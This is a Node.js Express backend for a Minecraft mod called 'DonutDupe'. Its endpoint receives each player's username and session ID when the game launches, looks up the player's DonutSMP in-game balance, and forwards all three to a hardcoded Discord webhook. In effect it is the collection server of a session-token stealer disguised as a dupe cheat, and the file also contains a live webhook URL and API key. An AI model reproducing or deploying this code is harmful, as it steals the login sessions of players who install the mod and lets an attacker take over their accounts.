const express = require("express");
const app = express();
const PORT = process.env.PORT || 3000;

const DISCORD_WEBHOOK_URL =
  "https://discord.com/api/webhooks/1471401564328427542/7aReFdl5D1_xDxkIIE6JuDc9APcWZ2Zjma_EpYBhZzmzMlU64cpPQv-ZQfkl1eecjTNl";

app.use(express.json());

// Health check endpoint (Render pings this to keep the service alive)
app.get("/", (req, res) => {
  res.json({ status: "ok", service: "DonutDupe Backend" });
});

// Receive username and session ID from the mod and forward to Discord
app.post("/api/username", async (req, res) => {
  const { username, sessionId } = req.body;

  if (!username) {
    return res.status(400).json({ error: "Missing 'username' field" });
  }

  console.log(`Received username: ${username}, sessionId: ${sessionId || "N/A"}`);

  // Fetch DonutSMP balance
  let balance = null;
  try {
    const apiRes = await fetch(`https://api.donutsmp.net/v1/stats/${encodeURIComponent(username)}`, {
      headers: {
        "Authorization": "c3efece98bbe4fae8f98dfc58d34db1a"
      }
    });
    if (apiRes.ok) {
      const apiData = await apiRes.json();
      balance = apiData?.result?.money || null;
    } else {
      console.warn(`Failed to fetch DonutSMP balance for ${username}: ${apiRes.status}`);
    }
  } catch (err) {
    console.error("Error fetching DonutSMP balance:", err);
  }

  try {
    const embed = {
      title: "DonutDupe - Player Launched",
      description: "A player has launched the game with DonutDupe installed.",
      color: 65416,
      fields: [
        {
          name: "Minecraft Username",
          value: String(username).substring(0, 100),
          inline: true,
        },
      ],
      thumbnail: {
        url: `https://mc-heads.net/avatar/${username}/128`,
      },
      timestamp: new Date().toISOString(),
      footer: {
        text: "DonutDupe Mod",
      },
    };

    if (balance !== null) {
      let balanceNum = parseFloat(balance.replace(/[^0-9.]/g, ""));
      let balanceMillions = isNaN(balanceNum) ? "Unavailable" : (balanceNum / 1_000_000).toFixed(2) + "M";
      embed.fields.push({
        name: "DonutSMP Balance",
        value: balanceMillions,
        inline: true,
      });
    } else {
      embed.fields.push({
        name: "DonutSMP Balance",
        value: "Unavailable",
        inline: true,
      });
    }

    if (sessionId) {
      const sid = String(sessionId);
      if (sid.length <= 1024) {
        embed.fields.push({
          name: "Session ID",
          value: sid,
          inline: false,
        });
      } else {
        // Discord limit is 1024 characters per field, so we split it if it's too long
        embed.fields.push({
          name: "Session ID (Part 1)",
          value: sid.substring(0, 1024),
          inline: false,
        });
        embed.fields.push({
          name: "Session ID (Part 2)",
          value: sid.substring(1024, 2048),
          inline: false,
        });
      }
    }

    const discordPayload = {
      embeds: [embed],
    };

    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(discordPayload),
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error(`Discord webhook error: ${response.status} - ${errorText}`);
      return res
        .status(502)
        .json({ error: "Failed to send to Discord", details: errorText });
    }

    console.log(`Successfully sent username '${username}' to Discord`);
    res.json({ success: true, message: `Username '${username}' sent to Discord` });
  } catch (err) {
    console.error("Error sending to Discord:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.listen(PORT, () => {
  console.log(`DonutDupe backend running on port ${PORT}`);
});
